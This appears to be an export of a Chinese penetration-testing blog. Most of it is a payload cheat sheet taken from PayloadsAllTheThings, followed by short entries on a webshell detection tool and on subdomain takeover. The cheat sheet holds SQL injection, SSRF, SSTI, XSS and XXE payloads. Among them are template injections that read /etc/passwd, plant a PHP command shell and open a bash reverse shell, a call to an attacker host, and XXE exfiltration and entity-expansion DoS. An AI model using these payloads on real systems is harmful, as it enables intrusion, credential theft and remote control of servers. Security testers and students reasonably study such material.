"1"="1"/*admin"or 1=1 or ""="admin" or 1=1admin" or 1=1--admin" or 1=1#admin" or 1=1/*admin") or ("1"="1admin") or ("1"="1"--admin") or ("1"="1"#admin") or ("1"="1"/*admin") or "1"="1admin") or "1"="1"--admin") or "1"="1"#admin") or "1"="1"/*1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055 认证绕过（Raw MD5）1234Example："SELECT * FROM admin WHERE pass = '".md5($password,true)."'"我们只有找到md5($password,true)中包含' or '[...]的字符即可md5("ffifdyop", true) = 'or'6�]��!r,��b� waf绕过123456789101112131415161718192021222324绕过空格?id=1%09and%091=1%09--?id=1%0Dand%0D1=1%0D--?id=1%0Cand%0C1=1%0C--?id=1%0Band%0B1=1%0B--?id=1%0Aand%0A1=1%0A--?id=1%A0and%A01=1%A0--注释?id=1/*comment*/and/**/1=1/**/--括号?id=(1)and(1)=(1)--绕过逗号LIMIT 0,1 -&gt; LIMIT 1 OFFSET 0SUBSTR('SQL',1,1) -&gt; SUBSTR('SQL' FROM 1 FOR 1).SELECT 1,2,3,4 -&gt; UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d等效符AND -&gt; &amp;&amp;OR -&gt; ||= -&gt; LIKE,REGEXP, not &lt; and not &gt;&gt; X -&gt; not between 0 and XWHERE -&gt; HAVING绕过information_schema.tablesselect * from mysql.innodb_table_stats;// select @@innodb_version; 15、SSRFExploit1234567891011121314可以利用SSRF攻击内网redis、discuz、fastcgi、uwsgi、memcache、struts2、内网系统、docker、Kubernetes、Hadoop、mysql等等1、基本利用http://localhost:80http://0.0.0.0:222、利用重定向设置一个子域名的DNS A记录为需要探测的内网IP，eg:127.0.0.1http://wwww.example.com/index.php?url=http://ssrf.w2n1ck.com3、利用文件上传修改"type=file"为"type=url"然后加入内网地址即可4、XSShttp://brutelogic.com.br/poc.svg -&gt; simple alerthttp://wwww.example.com/index.php?url=http://brutelogic.com.br/poc.svg Bypass1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465661、使用HTTPShttps://localhost/2、使用[::]http://[::]:80/http://0000::1:80/3、使用重定向localtest.me127.0.0.1.xip.iowww.owasp.org.127.0.0.1.xip.iocustomer1.app.localhost.my.company.127.0.0.1.nip.io4、使用CIDR(不知道是不是要配置什么，没利用成功)127.x.x.xhttp://127.127.127.127http://127.0.1.3http://127.0.0.0http://mail.ebc.apple.com =&gt; 127.0.0.6 =&gt; localhost5、使用异常urlslocalhost:+11211aaalocalhost:00011211aaaa参考：https://low-level.readthedocs.io/en/latest/documents/SSRFbible.Cheatsheet.pdf6、使用进制可以是十六进制，八进制等。115.239.210.26 &gt;&gt;&gt; 16373751032首先把这四段数字给分别转成16进制，结果：73 ef d2 1a然后把 73efd21a 这十六进制一起转换成8进制记得访问的时候加0表示使用八进制(可以是一个0也可以是多个0 跟XSS中多加几个0来绕过过滤一样)，十六进制加0xhttp://127.0.0.1 &gt;&gt;&gt; http://0177.0.0.1/http://127.0.0.1 &gt;&gt;&gt; http://2130706433/http://192.168.0.1 &gt;&gt;&gt; http://3232235521/http://192.168.1.1 &gt;&gt;&gt; http://3232235777/7、使用特殊地址http://0/8、使用@http://wwww.example.com@www.baidu.comhttp://wwww.example.com\x40www.baidu.comhttp://wwww.example.com%40www.baidu.com技巧组合:http://1.1.1.1 &amp;@2.2.2.2# @3.3.3.3/urllib2 + httplib: 1.1.1.1requests + browsers: 2.2.2.2urllib: 3.3.3.39、使用enclosed alphanumericshttp://ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ = example.comList:① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ ⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ ⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ ⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ ⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿10、利用解析器http://127.1.1.1:80\@127.2.2.2:80/http://127.1.1.1:80\@@127.2.2.2:80/http://127.1.1.1:80:\@@127.2.2.2:80/http://127.1.1.1:80#\@127.2.2.2:80/参考：https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf11、利用协议File协议file:///etc/passwdfile://\/\/etc/passwdDict协议dict://&lt;user&gt;;&lt;auth&gt;@&lt;host&gt;:&lt;port&gt;/d:&lt;word&gt;:&lt;database&gt;:&lt;n&gt;ssrf.php?url=dict://attacker:11111/SFTP协议ssrf.php?url=sftp://example.com:11111/TFTP协议ssrf.php?url=tftp://example.com:12346/TESTUDPPACKETLDAP协议ssrf.php?url=ldap://localhost:11211/%0astats%0aquitGopher协议ssrf.php?url=gopher://127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cvictime@site.com%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a 工具123SSRFmap - https://github.com/swisskyrepo/SSRFmapGopherus - https://github.com/tarunkant/Gopherushttp://blog.w2n1ck.com/ip.py 16、SSTIRuby123&lt;%= 7 * 7 %&gt; =&gt; 49&lt;%= File.open('/etc/passwd').read %&gt; =&gt; cat /etc/passwd&lt;%= Dir.entries('/') %&gt; =&gt; ls / Java12345678910111213$&#123;7*7&#125;$&#123;&#123;7*7&#125;&#125;$&#123;class.getClassLoader()&#125;$&#123;class.getResource("").getPath()&#125;$&#123;class.getResource("../../../../../index.htm").getContent()&#125;获取系统环境变量:$&#123;T(java.lang.System).getenv()&#125;获取/etc/passwd:$&#123;T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')&#125;$&#123;T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())&#125; Twig12345&#123;&#123;7*7&#125;&#125; == &#123;&#123;7*'7'&#125;&#125; == 49命令执行:&#123;&#123;self&#125;&#125;&#123;&#123;_self.env.setCache("ftp://attacker.net:2121")&#125;&#125;&#123;&#123;_self.env.loadTemplate("backdoor")&#125;&#125;&#123;&#123;_self.env.registerUndefinedFilterCallback("exec")&#125;&#125;&#123;&#123;_self.env.getFilter("id")&#125;&#125; Smarty12&#123;php&#125;echo `id`;&#123;/php&#125;&#123;Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"&lt;?php passthru($_GET['cmd']); ?&gt;",self::clearConfig())&#125; Jinja2123456789101112131415161718192021222324&#123;&#123;4*4&#125;&#125;[[5*5]]&#123;&#123;7*'7'&#125;&#125; =&gt; 7777777获取使用的类&#123;&#123; [].class.base.subclasses() &#125;&#125;&#123;&#123;''.class.mro()[1].subclasses()&#125;&#125;&#123;&#123; ''.__class__.__mro__[2].__subclasses__() &#125;&#125;获取配置变量&#123;% for key, value in config.iteritems() %&#125; &lt;dt&gt;&#123;&#123; key|e &#125;&#125;&lt;/dt&gt; &lt;dd&gt;&#123;&#123; value|e &#125;&#125;&lt;/dd&gt;&#123;% endfor %&#125;读取文件''.__class__.__mro__[2].__subclasses__()[40] 表示文件类&#123;&#123; ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() &#125;&#125;写文件&#123;&#123; ''.__class__.__mro__[2].__subclasses__()[40]('/var/www/html/hello.txt', 'w').write('Hello here !') &#125;&#125;反弹shell1、配置&#123;&#123; ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from subprocess import check_output\n\nRUNCMD = check_output\n') &#125;&#125;2、加载&#123;&#123; config.from_pyfile('/tmp/evilconfig.cfg') &#125;&#125;3、连接&#123;&#123; config['RUNCMD']('bash -i &gt;&amp; /dev/tcp/xx.xx.xx.xx/8000 0&gt;&amp;1',shell=True) &#125;&#125; 工具1234Tplmap - https://github.com/epinna/tplmappython2.7 ./tplmap.py -u 'http://www.target.com/page?name=John*' --os-shellpython2.7 ./tplmap.py -u "http://192.168.56.101:3000/ti?user=*&amp;comment=supercomment&amp;link"python2.7 ./tplmap.py -u "http://192.168.56.101:3000/ti?user=InjectHere*&amp;comment=A&amp;link" --level 5 -e jade 17、CSTIAngularJS12$eval('1+1')&#123;&#123;1+1&#125;&#125; Vue JS1&#123;&#123;constructor.constructor('alert(1)')()&#125;&#125; 18、目录遍历12345678910111213141516171819202122231、Basic../..\..\/%2e%2e%2f%252e%252e%252f%c0%ae%c0%ae%c0%af%uff0e%uff0e%u2215%uff0e%uff0e%u2216..././...\.\2、Unicode编码. = %u002e/ = %u2215\ = %u22163、url双编码. = %252e/ = %252f\ = %255c4、UTF-8 Unicode编码. = %c0%2e, %e0%40%ae, %c0ae/ = %c0%af, %e0%80%af, %c0%2f\ = %c0%5c, %c0%80%5c 19、文件上传Exploit123456789101112131415161718192021这里只举一下可以利用的点，就不一一详细例举了。1、黑名单绕过2、双文件上传3、数组4、修改特殊字段5、截断6、解析漏洞7、ffmpeg8、flash9、imagemagic10、zip软连接11、htaccess12、iis13、ssi14、pdf15、python16、csp17、xss18、超大文件ddos19、xxe20、URL跳转 20、XPATH注入1234567891011121314151617181920212223242526SQL: string(//user[name/text()='" +username+ "' and password/text()=’" +password+ "']/account/text())Payloads:' or '1'='1' or ''='x' or 1=1 or 'x'='y/////**/*@*count(/child::node())x' or name()='username' or 'x'='y' and count(/*)=1 and '1'='1' and count(/@*)=1 and '1'='1' and count(/comment())=1 and '1'='1盲注: 1、获取长度and string-length(account)=SIZE_INT2、获取内容substring(//user[userid=5]/username,2,1)=CHAR_HEREsubstring(//user[userid=5]/username,2,1)=codepoints-to-string(INT_ORD_CHAR_HERE) 21、XSSBasic1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859&lt;script&gt;alert('XSS')&lt;/script&gt;&lt;scr&lt;script&gt;ipt&gt;alert('XSS')&lt;/scr&lt;script&gt;ipt&gt;"&gt;&lt;script&gt;alert('XSS')&lt;/script&gt;"&gt;&lt;script&gt;alert(String.fromCharCode(88,83,83))&lt;/script&gt;&lt;img src=x onerror=alert('XSS');&gt;&lt;img src=x onerror=alert('XSS')//&lt;img src=x onerror=alert(String.fromCharCode(88,83,83));&gt;&lt;img src=x oneonerrorrror=alert(String.fromCharCode(88,83,83));&gt;&lt;img src=x:alert(alt) onerror=eval(src) alt=xss&gt;"&gt;&lt;img src=x onerror=alert('XSS');&gt;"&gt;&lt;img src=x onerror=alert(String.fromCharCode(88,83,83));&gt;&lt;svg/onload=alert('XSS')&gt;&lt;svg onload=alert(1)//&lt;svg/onload=alert(String.fromCharCode(88,83,83))&gt;&lt;svg id=alert(1) onload=eval(id)&gt;"&gt;&lt;svg/onload=alert(String.fromCharCode(88,83,83))&gt;"&gt;&lt;svg/onload=alert(/XSS/)&lt;body onload=alert(/XSS/.source)&gt;&lt;input autofocus onfocus=alert(1)&gt;&lt;select autofocus onfocus=alert(1)&gt;&lt;textarea autofocus onfocus=alert(1)&gt;&lt;keygen autofocus onfocus=alert(1)&gt;&lt;video/poster/onerror=alert(1)&gt;&lt;video&gt;&lt;source onerror="javascript:alert(1)"&gt;&lt;video src=_ onloadstart="alert(1)"&gt;&lt;details/open/ontoggle="alert`1`"&gt;&lt;audio src onloadstart=alert(1)&gt;&lt;marquee onstart=alert(1)&gt;&lt;meter value=2 min=0 max=10 onmouseover=alert(1)&gt;2 out of 10&lt;/meter&gt;&lt;body ontouchstart=alert(1)&gt;&lt;body ontouchend=alert(1)&gt;&lt;body ontouchmove=alert(1)&gt; &lt;META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K"&gt;&lt;meta/content="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgxMzM3KTwvc2NyaXB0Pg=="http-equiv=refresh&gt;&lt;META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');"&gt;javascript协议javascript:prompt(1)%26%23106%26%2397%26%23118%26%2397%26%23115%26%2399%26%23114%26%23105%26%23112%26%23116%26%2358%26%2399%26%23111%26%23110%26%23102%26%23105%26%23114%26%23109%26%2340%26%2349%26%2341&amp;#106&amp;#97&amp;#118&amp;#97&amp;#115&amp;#99&amp;#114&amp;#105&amp;#112&amp;#116&amp;#58&amp;#99&amp;#111&amp;#110&amp;#102&amp;#105&amp;#114&amp;#109&amp;#40&amp;#49&amp;#41\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3aalert(1)\u006A\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074\u003aalert(1)\152\141\166\141\163\143\162\151\160\164\072alert(1)java%0ascript:alert(1) - LF (\n)java%09script:alert(1) - tab (\t)java%0dscript:alert(1) - CR (\r)\j\av\a\s\cr\i\pt\:\a\l\ert\(1\) - escapejavascript://%0Aalert(1)javascript://anything%0D%0A%0D%0Awindow.alert(1)data协议data:text/html,&lt;script&gt;alert(0)&lt;/script&gt;data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+&lt;script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="&gt;&lt;/script&gt; XML文件123456789101112131415161718// 使用CDATA防止payload被解析成xml&lt;html&gt; &lt;head&gt;&lt;/head&gt; &lt;body&gt; &lt;something:script xmlns:something="http://www.w3.org/1999/xhtml"&gt;alert(1)&lt;/something:script&gt; &lt;info&gt; &lt;name&gt; &lt;value&gt;&lt;![CDATA[&lt;script&gt;confirm(document.domain)&lt;/script&gt;]]&gt;&lt;/value&gt; &lt;/name&gt; &lt;description&gt; &lt;value&gt;Hello&lt;/value&gt; &lt;/description&gt; &lt;url&gt; &lt;value&gt;http://www.baidu.com&lt;/value&gt; &lt;/url&gt; &lt;/info&gt; &lt;/body&gt;&lt;/html&gt; SVG文件12345678&lt;?xml version="1.0" standalone="no"?&gt;&lt;!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"&gt;&lt;svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg"&gt; &lt;polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/&gt; &lt;script type="text/javascript"&gt; alert(document.domain); &lt;/script&gt;&lt;/svg&gt; SWF12345678910111213141516flashmediaelement.swf?jsinitfunctio%gn=alert`1`flashmediaelement.swf?jsinitfunctio%25gn=alert(1)ZeroClipboard.swf?id=\"))&#125; catch(e) &#123;alert(1);&#125;//&amp;width=1000&amp;height=1000swfupload.swf?movieName="]);&#125;catch(e)&#123;&#125;if(!self.a)self.a=!alert(1);//swfupload.swf?buttonText=test&lt;a href="javascript:confirm(1)"&gt;&lt;img src="https://web.archive.org/web/20130730223443im_/http://appsec.ws/ExploitDB/cMon.jpg"/&gt;&lt;/a&gt;&amp;.swfplupload.flash.swf?%#target%g=alert&amp;uid%g=XSS&amp;moxieplayer.swf?url=https://github.com/phwd/poc/blob/master/vid.flv?raw=truevideo-js.swf?readyFunction=alert(1)player.swf?playerready=alert(document.cookie)player.swf?tracecall=alert(document.cookie)banner.swf?clickTAG=javascript:alert(1);//io.swf?yid=\"));&#125;catch(e)&#123;alert(1);&#125;//video-js.swf?readyFunction=alert%28document.domain%2b'%20XSSed!'%29bookContent.swf?currentHTMLURL=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4flashcanvas.swf?id=test\"));&#125;catch(e)&#123;alert(document.domain)&#125;//phpmyadmin/js/canvg/flashcanvas.swf?id=test\”));&#125;catch(e)&#123;alert(document.domain)&#125;// CSS1234567891011121314&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;style&gt;div &#123; background-image: url("data:image/jpg;base64,&lt;\/style&gt;&lt;svg/onload=alert(document.domain)&gt;"); background-color: #cccccc;&#125;&lt;/style&gt;&lt;/head&gt; &lt;body&gt; &lt;div&gt;lol&lt;/div&gt; &lt;/body&gt;&lt;/html&gt; 22、XXE12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt;&lt;!ENTITY xxe SYSTEM "file:///etc/passwd" &gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;Base64&lt;!DOCTYPE test [ &lt;!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"&gt; %init; ]&gt;&lt;foo/&gt;PHP协议&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;&lt;!ENTITY % xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php" &gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;DOS&lt;!DOCTYPE data [&lt;!ENTITY a0 "dos" &gt;&lt;!ENTITY a1 "&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;"&gt;&lt;!ENTITY a2 "&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;"&gt;&lt;!ENTITY a3 "&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;"&gt;&lt;!ENTITY a4 "&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;"&gt;]&gt;&lt;data&gt;&amp;a4;&lt;/data&gt;盲注发送payload:&lt;?xml version="1.0" ?&gt;&lt;!DOCTYPE r [&lt;!ELEMENT r ANY &gt;&lt;!ENTITY % sp SYSTEM "http://127.0.0.1/dtd.xml"&gt;%sp;%param1;]&gt;&lt;r&gt;&amp;exfil;&lt;/r&gt;远程主机上文件:http://127.0.0.1/dtd.xml&lt;!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"&gt;&lt;!ENTITY % param1 "&lt;!ENTITY exfil SYSTEM 'http://127.0.0.1/dtd.xml?%data;'&gt;"&gt;XXE in FileDOCX/XLSX/PPTXODT/ODG/ODP/ODSSVGXMLPDF (experimental)JPG (experimental)GIF (experimental)利用工具: https://github.com/BuffaloWill/oxml_xxe在线生成工具: https://buer.haus/xxegen/ 有兴趣的可以根据相关思路做个漏洞fuzz的字典，很有用的 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125w2n1ck@w2n1ck  ~/Desktop/vul_fuzz  tree -FC.├── api.txt├── command_exec.txt├── crlf.txt├── dicc.txt├── directory_traversal.txt├── ldap_attributes.txt├── lfi.txt├── nosql.txt├── open_redirect.txt├── php.txt├── sqli/│ ├── sqli.txt│ ├── sqli_error.txt│ ├── sqli_mssql.txt│ ├── sqli_mssql_insert.txt│ ├── sqli_mssql_where.txt│ ├── sqli_mysql.txt│ ├── sqli_mysql_insert.txt│ ├── sqli_mysql_order_by.txt│ ├── sqli_mysql_where.txt│ ├── sqli_oracle.txt│ ├── sqli_postgres.txt│ ├── sqli_time.txt│ └── sqli_union.txt├── ssi.txt├── upload/│ ├── ffmpeg/│ │ ├── gen_avi_bypass.py│ │ ├── gen_xbin_avi.py│ │ ├── read_passwd.avi│ │ ├── read_passwd_bypass.mp4│ │ ├── read_shadow.avi│ │ └── read_shadow_bypass.mp4│ ├── flash/│ │ ├── xss.swf│ │ └── xssproject.swf│ ├── htaccess/│ │ └── 1.jpg│ ├── iis/│ │ ├── index.stm│ │ └── web.config│ ├── imagemagic/│ │ ├── centos_id.jpg│ │ ├── payload_imageover_file_exfiltration_pangu_wrapper.jpg│ │ ├── payload_imageover_file_exfiltration_text_wrapper.jpg│ │ ├── payload_imageover_reverse_shell_devtcp.jpg│ │ ├── payload_imageover_reverse_shell_netcat_fifo.png│ │ ├── payload_imageover_wget.gif│ │ ├── payload_url_bind_shell_nc.mvg│ │ ├── payload_url_curl.png│ │ ├── payload_url_portscan.jpg│ │ ├── payload_url_remote_connection.mvg│ │ ├── payload_url_reverse_shell_bash.mvg│ │ ├── payload_url_touch.jpg│ │ ├── payload_xml_reverse_shell_nctraditional.xml│ │ ├── payload_xml_reverse_shell_netcat_encoded.xml│ │ ├── ubuntu_id.jpg│ │ └── ubuntu_shell.jpg│ ├── pdf/│ │ ├── poc.js│ │ ├── poc.py│ │ └── result.pdf│ ├── php_ext/│ │ ├── phpinfo.jpg.php│ │ ├── phpinfo.php3│ │ ├── phpinfo.php4│ │ ├── phpinfo.php5│ │ ├── phpinfo.php7│ │ ├── phpinfo.phpt│ │ ├── phpinfo.pht│ │ └── phpinfo.phtml│ ├── picture/│ │ ├── Build_image_to_LFI.py│ │ ├── php_exif_data.png│ │ ├── phpinfo-metadata.gif│ │ ├── phpinfo-metadata.jpg│ │ ├── shell_cinema.gif│ │ ├── shell_fr.gif│ │ └── shell_problem.gif│ ├── python/│ │ ├── python-admin-__init__.py.zip│ │ ├── python-conf-__init__.py.zip│ │ ├── python-config-__init__.py.zip│ │ ├── python-controllers-__init__.py.zip│ │ ├── python-generate-init.py│ │ ├── python-login-__init__.py.zip│ │ ├── python-models-__init__.py.zip│ │ ├── python-modules-__init__.py.zip│ │ ├── python-scripts-__init__.py.zip│ │ ├── python-settings-__init__.py.zip│ │ ├── python-tests-__init__.py.zip│ │ ├── python-urls-__init__.py.zip│ │ ├── python-utils-__init__.py.zip│ │ └── python-view-__init__.py.zip│ ├── ssi/│ │ ├── exec.shtml│ │ └── include.shtml│ └── zip_link/│ ├── etc_passwd.zip│ ├── generate.sh│ └── passwd├── web_cache_deception_attack_headers.txt├── xpath_injection.txt├── xss/│ ├── "&gt;&lt;img\ src=x\ onerror=alert(document.cookie);.jpg│ ├── "&gt;&lt;svg\ onload=alert(1)&gt;│ ├── xss_comment_exif_metadata_double_quote.png│ ├── xss_flashfile.swf│ ├── xss_intruders.txt│ ├── xss_payloads.txt│ ├── xss_svg.svg│ ├── xss_svg1.svg│ ├── xss_svg2.svg│ ├── xss_svg3.svg│ ├── xss_swf.swf│ ├── xss_swf_fuzz.txt│ ├── xss_xml.xml│ └── xss_xml_cheatsheet.html└── xxe/ ├── xml-attacks.txt ├── xxe_etc_passwd.xml ├── xxe_fuzzing.txt └── xxe_php_wrapper.xml 原仓库地址：https://github.com/swisskyrepo/PayloadsAllTheThings]]></content>
      <tags>
        <tag>渗透测试</tag>
        <tag>漏洞挖掘</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[webshell检测平台]]></title>
    <url>%2F2018%2F07%2F19%2Fwebshell%E6%A3%80%E6%B5%8B%E5%B9%B3%E5%8F%B0%2F</url>
    <content type="text"><![CDATA[0x01 相关技术 Python 编程语言使用python开发，纯属为了学习编程。 Flask 使用Flask作为Web开发微框架，交与其他Python框架，具有简便、易扩展等优点。具体可看：Flask中文文档 MySQL MySQL 是最流行的关系型数据库管理系统，在WEB应用方面 MySQL 是最好的RDBMS(Relational Database Management System：关系数据库管理系统)应用软件之一。文档参考：MySQL教程应用软件之一) inotify 从 Linux 2.6.13 内核开始，Linux 就推出了 inotify，允许监控程序打开一个独立文件描述符，并针对事件集监控一个或者多个文件，例如打开、关闭、移动/重命名、删除、创建或者改变属性，文档参考：用 inotify 监控 Linux 文件系统事件 0x02 扫描流程 0x03 具体实现文件监控模块 使用inotify一直循环监听文件上传的目录，发现新文件立即调用扫描引擎检测。 查杀模块 先判断文件大小，文件过大则跳过。 检测规则有两种： 当type等于1时，是使用的是静态匹配； 当type等于2时，是使用的正则匹配，正则匹配需满足所有正则条件才算成功匹配； 扫描结束后，将结果插入数据库。 其中检测规则使用的是@haozige之前逆向的阿里云、腾讯云的webshell检测规则： 0x04 Todo1、机器学习检测webshell：深度学习PHP webshell查杀引擎demo 2、语义分析（旁路、沙盒）检测webshell：Webshell查杀的新思路 3、基于流量模式检测webshell（做agent的话很有用） 4、逆向算法+静态匹配检测webshell：D盾webshell查杀]]></content>
      <tags>
        <tag>渗透测试</tag>
        <tag>Python</tag>
        <tag>自动化</tag>
        <tag>MySQL</tag>
        <tag>Flask</tag>
        <tag>inotify</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[子域名劫持（Subdomain takeover）]]></title>
    <url>%2F2018%2F07%2F12%2F%E5%AD%90%E5%9F%9F%E5%90%8D%E5%8A%AB%E6%8C%81%EF%BC%88Subdomain-takeover%EF%BC%89%2F</url>
    <content type="text"><![CDATA[学到了一个新的漏洞类型，记录学习下 0x01 域名解析域名解析是由DNS协议完成的，包含了多种记录类型，比如： A (Address) 记录：指明域名对应的哪个IP NS记录：指明由哪台服务器对该域名进行解析 CNAME记录：别名记录，将一个域名映射到另一个域名的记录（比如：张晓明的小名叫小明，小名和晓明都是同一个人） 0x02 子域名劫持原理怎么简单怎么说： 比如：子域名test.example.com通过CNAME记录指向一个比如testcdn.img.aliyun.com域名，但该主机名已经不存在或者过期了，这样我们就可以注册、创建一个这个不存在的testcdn.img.aliyun.com域名，达到子域名劫持的目的 0x03 漏洞检测子域名劫持漏洞检测有三种方法： 1、使用dig、nslookup123456789101112# nslookup ping.ubnt.com 8.8.8.8Server: 8.8.8.8Address: 8.8.8.8#53Non-authoritative answer:ping.ubnt.com canonical name = dl.ubnt.com.dl.ubnt.com canonical name = d2cnv2pop2xy4v.cloudfront.net.Name: d2cnv2pop2xy4v.cloudfront.netAddress: 54.192.96.244# dig example.com | grep CNAMEexample.com. 3027 IN CNAME example.cloudfront.net. 然后访问出现的CNAME记录值，如果显示不存在，那么Congratulations！ 2、直接访问子域名如果出现类似下面这种情况，那么Congratulations！ 3、使用工具-aquatone直接使用aquatone-takeover —d target.com即可 0x04 漏洞危害1、认证劫持、钓鱼由于攻击者已经控制了该子域名，那么攻击者就可以构造特定的页面诱导用户操作，比如登陆表单、密码表单等，由于是完全正常的可信的域名，所以很难以分别是否存在钓鱼。 2、会话劫持这种对那些大型企业危害巨大，现在很多网站使用单点登陆（SSO），那么Cookie就是在整个域中共享的，那么攻击者只需要接受到用户的Cookie，即可操作其他域名了。]]></content>
      <tags>
        <tag>渗透测试</tag>
        <tag>子域名劫持</tag>
        <tag>takeover</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[命令执行绕过之Linux通配符]]></title>
    <url>%2F2018%2F05%2F29%2F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87%E4%B9%8BLinux%E9%80%9A%E9%85%8D%E7%AC%A6%2F</url>
